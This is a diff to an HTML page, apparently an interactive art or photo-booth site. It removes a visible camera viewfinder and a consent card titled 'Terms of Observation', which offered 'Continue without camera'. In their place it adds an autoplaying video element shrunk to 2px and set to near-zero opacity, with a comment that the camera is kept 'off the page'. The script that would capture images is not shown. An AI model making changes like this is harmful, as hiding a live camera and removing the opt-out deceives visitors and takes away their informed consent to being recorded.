@@ -481,19 +481,11 @@ body.awake #dock{transform:translateY(0)}
     <div class="edge"></div>
   </div>
 
-  <div class="finder">
-    <video id="camFeed" playsinline muted autoplay style="display:none"></video>
-    <canvas class="view" id="camView" width="480" height="320"></canvas>
-    <div class="scan"></div>
-    <div class="vig"></div>
-    <div class="frame"><i></i><i></i><i></i><i></i></div>
-    <div class="cross"></div>
-    <div class="rec"><b></b> REC</div>
-    <div class="meta">F 2.8 &nbsp;·&nbsp; 1/60 &nbsp;·&nbsp; ISO 1600<br><b id="introTrack">—</b></div>
-  </div>
+  <!-- the camera itself: off the page, no picture of you is ever shown -->
+  <video id="camFeed" playsinline muted autoplay aria-hidden="true"
+         style="position:fixed;left:0;top:0;width:2px;height:2px;opacity:.001;pointer-events:none"></video>
 
   <canvas id="camShot" style="display:none"></canvas>
-  <div class="count" id="count"><span class="ring"></span><span class="sweep"></span><b></b></div>
   <div class="flash" id="flash"></div>
 
   <div class="print" id="print">
@@ -512,24 +504,6 @@ body.awake #dock{transform:translateY(0)}
   <div class="flames" aria-hidden="true"></div>
   <div class="firelight" aria-hidden="true"></div>
   <div class="hint" id="hint" data-i18n="in.hint">Take the print — drag it</div>
-
-  <div class="gate" id="gate">
-    <div class="gate-card">
-      <p class="gate-kicker" data-i18n="in.kicker">Before the dossier · observation clause</p>
-      <h2 data-i18n="in.title">Terms of Observation</h2>
-      <p class="gate-lead" data-i18n="in.lead">This room is fitted with a camera…</p>
-      <div class="gate-body">
-        <p data-i18n="in.p1"></p>
-        <p data-i18n="in.p2"></p>
-        <p data-i18n="in.p3"></p>
-      </div>
-      <div class="gate-acts">
-        <button id="introStart" class="gate-allow"><i></i><span data-i18n="in.allow">Allow camera</span></button>
-        <button id="introDecline" class="gate-decline" data-i18n="in.decline">Continue without camera</button>
-      </div>
-      <p class="gate-fine" data-i18n="in.fine">No upload · no analytics · no storage</p>
-    </div>
-  </div>
 
   <button class="skip" id="introSkip" data-i18n="in.skip">skip</button>
   <div class="blackout"></div>
